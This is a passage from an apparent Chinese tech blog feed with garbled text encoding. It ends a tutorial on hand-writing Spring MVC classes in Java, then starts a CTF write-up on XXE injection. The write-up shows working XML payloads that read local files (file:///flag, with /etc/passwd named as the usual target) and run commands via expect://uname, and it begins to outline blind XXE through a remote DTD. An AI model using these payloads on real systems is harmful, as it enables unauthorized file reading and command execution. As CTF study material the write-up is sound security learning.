class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div></li></ul><h2 id="è¡¥å…¨MyHandlerAdapter"><a href="#è¡¥å…¨MyHandlerAdapter" class="headerlink" title="è¡¥å…¨MyHandlerAdapter"></a>è¡¥å…¨MyHandlerAdapter</h2><ul><li><p>åœ¨handle()ä¸­åˆ©ç”¨åå°„æ¥è°ƒç”¨è¢«é€‚é…çš„ç›®æ ‡æ–¹æ³•ï¼Œå¹¶å°†è½¬æ¢å¥½çš„å‚æ•°åˆ—è¡¨ä¼ é€’è¿‡å»</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> MyModelAndView <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp,Object handler)</span><span class="hljs-keyword">throws</span> Exception&#123;    <span class="hljs-type">MyHandlerMapping</span> <span class="hljs-variable">handlerMapping</span> <span class="hljs-operator">=</span> (MyHandlerMapping) handler;      <span class="hljs-comment">//æ¯ä¸ªæ–¹æ³•éƒ½æœ‰ä¸€ä¸ªå‚æ•°åˆ—è¡¨ï¼Œè¿™é‡Œä¿å­˜çš„æ˜¯å½¢å‚åˆ—è¡¨</span>    HashMap&lt;String, Integer&gt; paramMapping = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();      <span class="hljs-comment">//è¿™é‡Œåªæ˜¯ç»™å‡ºå‘½åå‚æ•°</span>    Annotation[][] pa = handlerMapping.getMethod().getParameterAnnotations();    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; pa.length; i++) &#123;        <span class="hljs-keyword">for</span> (Annotation a : pa[i]) &#123;            <span class="hljs-keyword">if</span>(a <span class="hljs-keyword">instanceof</span> MyRequestParam)&#123;                <span class="hljs-type">String</span> <span class="hljs-variable">paramName</span> <span class="hljs-operator">=</span> ((MyRequestParam) a).value();                <span class="hljs-keyword">if</span>(!<span class="hljs-string">&quot;&quot;</span>.equals(paramName.trim()))&#123;                    paramMapping.put(paramName,i);                &#125;            &#125;        &#125;    &#125;      <span class="hljs-comment">//æ ¹æ®ç”¨æˆ·è¯·æ±‚çš„å‚æ•°ä¿¡æ¯ï¼Œè·ŸMethodä¸­çš„å‚æ•°ä¿¡æ¯è¿›è¡ŒåŠ¨æ€åŒ¹é…</span>    <span class="hljs-comment">//resp ä¼ è¿›æ¥çš„ç›®çš„åªæœ‰ä¸€ä¸ªï¼šå°†å…¶èµ‹å€¼ç»™æ–¹æ³•å‚æ•°ï¼Œä»…æ­¤è€Œå·²</span>      <span class="hljs-comment">//åªæœ‰å½“ç”¨æˆ·ä¼ è¿‡æ¥çš„ModelAndViewä¸ºç©ºçš„æ—¶å€™ï¼Œæ‰ä¼šé»˜è®¤æ–°å»ºä¸€ä¸ªé»˜è®¤çš„</span>      <span class="hljs-comment">//1.è¦å‡†å¤‡å¥½è¿™ä¸ªæ–¹æ³•çš„å½¢å‚åˆ—è¡¨</span>    <span class="hljs-comment">//æ–¹æ³•é‡è½½æ—¶å½¢å‚çš„å†³å®šå› ç´ 1ï¼šå‚æ•°çš„ä¸ªæ•°ã€å‚æ•°çš„ç±»å‹ã€å‚æ•°é¡ºåºã€æ–¹æ³•çš„åå­—</span>    <span class="hljs-comment">//åªå¤„ç†Requestå’ŒResponse</span>    Class&lt;?&gt;[] paramTypes = handlerMapping.getMethod().getParameterTypes();    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; paramTypes.length; i++) &#123;        Class&lt;?&gt; type = paramTypes[i];        <span class="hljs-keyword">if</span>(type == HttpServletRequest.class || type == HttpServletResponse.class)&#123;            paramMapping.put(type.getName(),i);        &#125;    &#125;      <span class="hljs-comment">//2.å¾—åˆ°è‡ªå®šä¹‰å‘½åå‚æ•°çš„æ‰€åœ¨ä½ç½®</span>    <span class="hljs-comment">//ç”¨æˆ·é€šè¿‡URLä¼ è¿‡æ¥çš„å‚æ•°åˆ—è¡¨</span>    Map&lt;String,String[]&gt; parameterMap = req.getParameterMap();      <span class="hljs-comment">//3.æ„é€ å®å‚åˆ—è¡¨</span>    Object[] paramValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[paramTypes.length];      <span class="hljs-keyword">for</span> (Map.Entry&lt;String, String[]&gt; param : parameterMap.entrySet()) &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> Arrays.toString(param.getValue()).replaceAll(<span class="hljs-string">&quot;\\[|\\]&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replaceAll(<span class="hljs-string">&quot;\\s&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);          <span class="hljs-keyword">if</span>(!paramMapping.containsKey(param.getKey()))<span class="hljs-keyword">continue</span>;          <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> paramMapping.get(param.getKey());          <span class="hljs-comment">//å› ä¸ºé¡µé¢ä¼ è¿‡æ¥çš„å€¼éƒ½æ˜¯Stringç±»å‹çš„ï¼Œè€Œåœ¨æ–¹æ³•ä¸­å®šä¹‰çš„ç±»å‹æ˜¯åƒå˜ä¸‡åŒ–çš„ï¼Œ</span>        <span class="hljs-comment">//æ‰€ä»¥è¦é’ˆå¯¹æˆ‘ä»¬ä¼ è¿‡æ¥çš„å‚æ•°è¿›è¡Œç±»å‹è½¬æ¢</span>        paramValues[index] = caseStringValue(value,paramTypes[index]);    &#125;      <span class="hljs-keyword">if</span>(paramMapping.containsKey(HttpServletRequest.class.getName()))&#123;        <span class="hljs-type">int</span> <span class="hljs-variable">reqIndex</span> <span class="hljs-operator">=</span> paramMapping.get(HttpServletRequest.class.getName());        paramValues[reqIndex] = req;    &#125;      <span class="hljs-keyword">if</span>(paramMapping.containsKey(HttpServletResponse.class.getName()))&#123;        <span class="hljs-type">int</span> <span class="hljs-variable">respIndex</span> <span class="hljs-operator">=</span> paramMapping.get(HttpServletResponse.class.getName());        paramValues[respIndex] = resp;    &#125;      <span class="hljs-comment">//4.ä»handlerä¸­å–å‡ºControllerã€Methodï¼Œç„¶ååˆ©ç”¨åå°„æœºåˆ¶è¿›è¡Œè°ƒç”¨</span>    <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> handlerMapping.getMethod().invoke(handlerMapping.getController(), paramValues);    <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == result)<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;      <span class="hljs-type">boolean</span> <span class="hljs-variable">isModelAndView</span> <span class="hljs-operator">=</span> handlerMapping.getMethod().getReturnType() == MyModelAndView.class;    <span class="hljs-keyword">if</span>(isModelAndView)&#123;        <span class="hljs-keyword">return</span> (MyModelAndView) result;    &#125;<span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;  <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">caseStringValue</span><span class="hljs-params">(String value, Class&lt;?&gt; clazz)</span> &#123;    <span class="hljs-keyword">if</span>(clazz == String.class)&#123;        <span class="hljs-keyword">return</span> value;    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(clazz == Integer.class)&#123;        <span class="hljs-keyword">return</span> Integer.valueOf(value);    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(clazz == <span class="hljs-type">int</span>.class)&#123;        <span class="hljs-keyword">return</span> Integer.valueOf(value).intValue();    &#125;<span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;&#125;</code></pre></div></li></ul><h2 id="è¡¥å…¨MyModelAndView"><a href="#è¡¥å…¨MyModelAndView" class="headerlink" title="è¡¥å…¨MyModelAndView"></a>è¡¥å…¨MyModelAndView</h2><ul><li><p>åŸç”Ÿsprngä¸­ModelAndViewç±»ä¸»è¦ç”¨äºå°è£…é¡µé¢æ¨¡ç‰ˆå’Œå¾€é¡µé¢ä¸­ä¼ é€å‚æ•°çš„å¯¹åº”å…³ç³»</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;<span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-meta">@Data</span><span class="hljs-meta">@AllArgsConstructor</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyModelAndView</span> &#123;    <span class="hljs-keyword">private</span> String viewName;<span class="hljs-comment">//é¡µé¢æ¨¡ç‰ˆåç§°</span>    <span class="hljs-keyword">private</span> Map&lt;String,?&gt; model;<span class="hljs-comment">//å¾€é¡µé¢ä¼ é€çš„å‚æ•°</span>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyModelAndView</span><span class="hljs-params">(String viewName)</span> &#123; <span class="hljs-built_in">this</span>.viewName = viewName; &#125;&#125;</code></pre></div></li></ul><h2 id="è¡¥å…¨MyViewResolver"><a href="#è¡¥å…¨MyViewResolver" class="headerlink" title="è¡¥å…¨MyViewResolver"></a>è¡¥å…¨MyViewResolver</h2><ul><li><p>ViewResolverä¸»è¦å®Œæˆæ¨¡ç‰ˆåç§°å’Œæ¨¡ç‰ˆè§£æå¼•æ“çš„åŒ¹é…ï¼Œé€šè¿‡åœ¨Serlvetä¸­è°ƒç”¨resolveViewName()æ–¹æ³•æ¥è·å–å¯¹åº”æ¨¡ç‰ˆæ‰€å¯¹åº”çš„Viewã€‚</p></li><li><p>è¿™é‡Œæš‚æ—¶åªå®ç°ä»¥ä¸€å¥—é»˜è®¤çš„æ¨¡ç‰ˆå¼•æ“ï¼Œè¯­æ³•ä¹Ÿæ˜¯å®Œå…¨è‡ªå®šä¹‰ã€‚</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> java.util.Locale;<span class="hljs-comment">/**</span><span class="hljs-comment"> * ä»»åŠ¡1ï¼šå°†ä¸€ä¸ªé™æ€æ–‡ä»¶å˜æˆä¸€ä¸ªåŠ¨æ€æ–‡ä»¶</span><span class="hljs-comment"> * ä»»åŠ¡2ï¼šæ ¹æ®ç”¨æˆ·ä¼ é€ä¸åŒçš„å‚æ•°ï¼Œäº§ç”Ÿä¸åŒçš„ç»“æœï¼Œæœ€ç»ˆè¾“å‡ºå­—ç¬¦ä¸²ï¼Œäº¤ç»™Responseè¾“å‡º</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewResolver</span> &#123;    <span class="hljs-comment">//é»˜è®¤è§£æhtmlæ–‡ä»¶</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_TEMPLATE_SUFFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.html&quot;</span>;        <span class="hljs-keyword">private</span> File templateRootDir;        <span class="hljs-keyword">private</span> String viewName;        <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyViewResolver</span><span class="hljs-params">(String templateRoot)</span>&#123;        <span class="hljs-type">String</span> <span class="hljs-variable">templateRootPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(templateRoot).getFile();        <span class="hljs-built_in">this</span>.templateRootDir = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(templateRootPath);    &#125;        <span class="hljs-keyword">public</span> MyView <span class="hljs-title function_">resolveViewName</span><span class="hljs-params">(String viewName, Locale locale)</span><span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-built_in">this</span>.viewName = viewName;        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span> == viewName || <span class="hljs-string">&quot;&quot;</span>.equals(viewName.trim()))<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        viewName = viewName.endsWith(DEFAULT_TEMPLATE_SUFFIX)?viewName:(viewName+DEFAULT_TEMPLATE_SUFFIX);        <span class="hljs-type">File</span> <span class="hljs-variable">templateFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>((templateRootDir.getPath() + <span class="hljs-string">&quot;/&quot;</span> + viewName).replaceAll(<span class="hljs-string">&quot;/+&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>));        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyView</span>(templateFile);    &#125;        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getViewName</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> viewName;    &#125;&#125;</code></pre></div></li></ul><h2 id="MyView"><a href="#MyView" class="headerlink" title="MyView"></a>MyView</h2><ul><li><p>è‡ªå®šä¹‰æ¨¡ç‰ˆå¼•æ“ï¼Œæ ¸å¿ƒæ–¹æ³•æ˜¯render()ï¼Œåœ¨render()æ–¹æ³•ä¸­å®Œæˆå¯¹æ¨¡ç‰ˆçš„æ¸²æŸ“ï¼Œæœ€ç»ˆè¿”å›æµè§ˆå™¨èƒ½è¯†åˆ«çš„å­—ç¬¦ä¸²ï¼Œé€šè¿‡responseè¾“å‡º</p></li><li><p>æˆ‘æ‰€å®ç°çš„Viewæ˜¯åŸºäºHTMLæ–‡ä»¶æ¥å¯¹é¡µé¢è¿›è¡Œæ¸²æŸ“çš„ï¼Œæ¨¡ç‰ˆè¡¨è¾¾å¼ä¸ºÂ¥{name}</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.czh.spring.framework.webmvc;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.File;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.RandomAccessFile;<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.regex.Matcher;<span class="hljs-keyword">import</span> java.util.regex.Pattern;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyView</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_CONTENT_TYPE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>;    <span class="hljs-keyword">private</span> File viewFile;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyView</span><span class="hljs-params">(File viewFile)</span>&#123;        <span class="hljs-built_in">this</span>.viewFile = viewFile;    &#125;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getContentType</span><span class="hljs-params">()</span>&#123;        <span class="hljs-keyword">return</span> DEFAULT_CONTENT_TYPE;    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();        <span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">ra</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(<span class="hljs-built_in">this</span>.viewFile, <span class="hljs-string">&quot;r&quot;</span>);        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;            <span class="hljs-keyword">while</span> (<span class="hljs-literal">null</span> != (line = ra.readLine()))&#123;                line = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(line.getBytes(StandardCharsets.ISO_8859_1),StandardCharsets.UTF_8);                <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;Â¥\\&#123;[^\\&#125;]+\\&#125;&quot;</span>, Pattern.CASE_INSENSITIVE);                <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(line);                                <span class="hljs-keyword">while</span> (matcher.find())&#123;                    <span class="hljs-type">String</span> <span class="hljs-variable">paramName</span> <span class="hljs-operator">=</span> matcher.group();                    paramName = paramName.replaceAll(<span class="hljs-string">&quot;Â¥\\&#123;|\\&#125;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);                    <span class="hljs-type">Object</span> <span class="hljs-variable">paramValue</span> <span class="hljs-operator">=</span> model.get(paramName);                    <span class="hljs-comment">//è¦æŠŠÂ¥&#123;&#125;ä¸­é—´çš„è¿™ä¸ªå­—ç¬¦å–å‡ºæ¥</span>                    line = matcher.replaceFirst(makeStringForRegExp(paramName.toString()));                    matcher = pattern.matcher(line);                &#125;                sb.append(line);            &#125;        &#125; <span class="hljs-keyword">finally</span> &#123;            ra.close();        &#125;        response.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);        response.getWriter().write(sb.toString());    &#125;    <span class="hljs-comment">//å¤„ç†ç‰¹æ®Šå­—ç¬¦</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">makeStringForRegExp</span><span class="hljs-params">(String str)</span> &#123;        <span class="hljs-keyword">return</span> str.replace(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;\\\\&quot;</span>).replace(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;\\*&quot;</span>)                .replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;\\+&quot;</span>).replace(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;\\|&quot;</span>)                .replace(<span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;\\&#123;&quot;</span>).replace(<span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;\\&#125;&quot;</span>)                .replace(<span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;\\(&quot;</span>).replace(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;\\)&quot;</span>)                .replace(<span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;\\^&quot;</span>).replace(<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;\\$&quot;</span>)                .replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;\\[&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;\\]&quot;</span>)                .replace(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;\\?&quot;</span>).replace(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;\\,&quot;</span>)                .replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;\\.&quot;</span>).replace(<span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;\\&amp;&quot;</span>);    &#125;&#125;</code></pre></div></li></ul><h2 id="è¿è¡Œæµ‹è¯•"><a href="#è¿è¡Œæµ‹è¯•" class="headerlink" title="è¿è¡Œæµ‹è¯•"></a>è¿è¡Œæµ‹è¯•</h2><ul><li><p>application.properties</p><div class="code-wrapper"><pre><code class="hljs yml"><span class="hljs-comment">#æ‰˜ç®¡çš„ç±»æ‰«æåŒ…è·¯å¾„#</span><span class="hljs-string">scanPackage=com.czh.spring.demo</span><span class="hljs-string">templateRoot=layouts</span></code></pre></div></li><li><p>æ‰“waråŒ…è¿è¡Œåœ¨tomcatä¸Š</p></li><li><p>è®¿é—®<a href="http://localhost:8080/luelueking_Spring_Source_war/">http://localhost:8080/luelueking_Spring_Source_war/</a></p><p><img src="https://img-blog.csdnimg.cn/a44034a8dd20448c9c60001b8ffba403.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li><li><p>è®¿é—®<a href="http://localhost:8080/luelueking_Spring_Source_war/web/add.json?name=luelueking&amp;address=China">http://localhost:8080/luelueking_Spring_Source_war/web/add.json?name=luelueking&amp;address=China</a></p><p><img src="https://img-blog.csdnimg.cn/ac7ffe114cf24075b30d71106435581a.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li><li><p>è®¿é—®<a href="http://localhost:8080/luelueking_Spring_Source_war/first.html?name=luelueking">http://localhost:8080/luelueking_Spring_Source_war/first.html?name=luelueking</a><br><img src="https://img-blog.csdnimg.cn/6ef1ed16c2834486ac6c02a80472a950.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p></li><li><p>å…¶ä»–è‡ªå·±æµ‹ï¼Œå¯èƒ½ä¼šæœ‰å°bugï¼Œä¸è¿‡ç›¸ä¿¡ä½ è‡ªå·±å¯ä»¥è§£å†³</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>æ‰‹å†™spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æµ…å°XXEæ¼æ´[NCTF2019]Fake XML cookbook</title>
    <link href="/2022/08/15/XXE%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/08/15/XXE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>psï¼šä¸€ç‚¹éªšè¯ï¼šæœ€è¿‘WPå†™çš„ä¸æ˜¯å¾ˆå‹¤å¿«äº†ï¼Œä¸€æ–¹é¢æ˜¯ctfä¸Šçš„å­¦ä¹ å¥½åƒæ¥åˆ°äº†ç“¶é¢ˆæœŸï¼Œé¢˜ç›®çš„éš¾åº¦ä¸æ–­ä¸Šå‡ï¼ˆåŠ ä¸Šå¤§ä½¬çš„WPå†™çš„å¾ˆå¥½ï¼Œè‡ªæ„§ä¸å¦‚ï¼‰ï¼Œè‡ªå·±ç»å¸¸åªèƒ½åœç•™åœ¨å¤ç°çš„çŠ¶æ€ï¼ŒäºŒæ˜¯ä¸€æ–¹é¢å…¶å®æˆ‘å·²ç»è®¤è¯†åˆ°å¼€å‘ä¸å®‰å…¨äºŒè€…ä¹‹é—´å¯†åˆ‡çš„å…³ç³»ï¼Œæ‰€ä»¥æœ‰åœ¨æ£é¼“ä¸€äº›åˆ«çš„ä¸œè¥¿ï¼Œè™½ç„¶å‰æœŸå¯èƒ½å¯¹æ‰“æ¯”èµ›å¸®åŠ©å¾®å¼±ï¼Œä½†æˆ‘è®¤ä¸ºè¿™æ˜¯æˆ‘æŠ€æœ¯æ–¹å‘å†…åŠŸçš„ç§¯ç´¯ã€‚è·¯è¿˜å¾ˆé•¿ï¼Œè¿˜æ˜¯å¾—åšæŒï¼Œæœ€è¿‘å¯èƒ½è¦å¤šåšæ€»ç»“ï¼Œç›®å‰åœ¨ç§¯ç´¯ä¸€äº›å§¿åŠ¿åº“ï¼Œåç»­ä¼šæ›´æ–°ã€‚ã€‚ã€‚è¿˜æ˜¯çœ‹æ­£æ–‡å§ã€‚</p><h3 id="NCTF2019-Fake-XML-cookbook-WriteUp"><a href="#NCTF2019-Fake-XML-cookbook-WriteUp" class="headerlink" title="[NCTF2019]Fake XML cookbook WriteUp"></a>[NCTF2019]Fake XML cookbook WriteUp</h3><ul><li><p>æ‰“å¼€é¢˜ç›® ç»å…¸ç™»å½• ç›²çŒœsql å®åˆ™åé¢˜ ä¸€çœ‹æ ‡é¢˜ XMLbook ç½‘ä¸Šä¸€æœ XXEæ¼æ´</p><p><img src="https://img-blog.csdnimg.cn/dea273ad54d9411eac319c0e42bd5fd0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>XXE å…¨ç§°XML External Entity Injection å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼ˆåœ¨æˆ‘çœ‹æ¥å°±æ˜¯æ³¨å…¥xmlç±»å‹æ•°æ®æç‚¹èŠ±ç½¢äº†ï¼‰</p></li><li><p>å…ˆçœ‹è¿™é¢˜payload</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><span class="hljs-meta">  ]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/cba5fd6edd3e47c3a22ab281ea693956.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>å¯ä»¥çœ‹å‡ºæ˜¯è¯»å–äº†flagæ–‡ä»¶çš„å†…å®¹ï¼Œæ³¨æ„è¿™é‡Œå› ä¸ºå°†<code>file:///flag</code>å‘½åä¸ºadminï¼Œæ‰€ä»¥ä¸‹é¢ç”¨&amp;admin</p></li><li><p>ä¸‹é¢å°±æ˜¯å­¦ä¹ äº†ï¼Œæµ…å­¦ä¹‹åæ€»ç»“ä¸€ä¸‹ï¼š</p></li></ul><h3 id="æŒ–æ˜xxeè‚‰å†»"><a href="#æŒ–æ˜xxeè‚‰å†»" class="headerlink" title="æŒ–æ˜xxeè‚‰å†»"></a>æŒ–æ˜xxeè‚‰å†»</h3><ul><li><strong>åˆ©ç”¨æ¡ä»¶</strong>ï¼š<ul><li>libxmlå°äº2.9.1</li><li>libxml_disable_entity_loaderé€‰é¡¹è®¾ç½®ä¸ºfalse</li></ul></li><li><strong>ä½¿ç”¨</strong>ï¼šé€šè¿‡xxeè¯»å–ç›®æ ‡æ–‡ä»¶å†…å®¹ï¼Œä¸€èˆ¬å°±è¿™ä¹ˆç”¨ï¼Œè¯»çš„å°±æ˜¯&#x2F;etc&#x2F;passwordæ–‡ä»¶ï¼Œæ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ä¸ç°å®</li><li><strong>å‘ç°</strong>ï¼š<ul><li>æŠ“åŒ…çœ‹acceptå¤´æ˜¯å¦æ¥å—xml</li><li>æŠ“åŒ…ä¿®æ”¹æ•°æ®ç±»å‹ï¼ŒæŠŠjsonæ”¹ä¸ºxmlæ¥ä¼ æ•°æ®</li></ul></li></ul><h3 id="æœ‰å›æ˜¾çš„æ”»å‡»"><a href="#æœ‰å›æ˜¾çš„æ”»å‡»" class="headerlink" title="æœ‰å›æ˜¾çš„æ”»å‡»"></a>æœ‰å›æ˜¾çš„æ”»å‡»</h3><ul><li><p>[NCTF2019]Fake XML cookbookå°±æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p></li><li><p>ä¸€èˆ¬æ€§</p><div class="code-wrapper"><pre><code class="hljs xml">[ run &quot;uname&quot; command]<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://uname&quot;</span> &gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></code></pre></div></li><li><p>å½“ç„¶ä¹Ÿå¯ä»¥æŠŠ<code>expect://uname</code>è¿™ä¸ªéƒ¨åˆ†æ”¹ä¸ºå¤–é“¾æ¥æ¥ç»•è¿‡æŸäº›è¿‡æ»¤ï¼Œä½†è¿™å°±æ²¡æ„æ€äº†å—·</p></li></ul><h3 id="æ— å›æ˜¾æ”»å‡»"><a href="#æ— å›æ˜¾æ”»å‡»" class="headerlink" title="æ— å›æ˜¾æ”»å‡»"></a>æ— å›æ˜¾æ”»å‡»</h3><ul><li><p>å»ºç«‹ä¸€ä¸ªdtdæ–‡ä»¶ï¼Œåœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šé¢æ”¾å…¥dtdæ–‡ä»¶ï¼Œåˆ©ç”¨ä»¥åå¦‚æœæ— æŠ¥é”™å°±éœ€è¦æŸ¥çœ‹æ•°æ®æ—¥å¿—æ–‡ä»¶ä¿¡æ¯ï¼Œå¯ä»¥çœ‹base64ç¼–ç 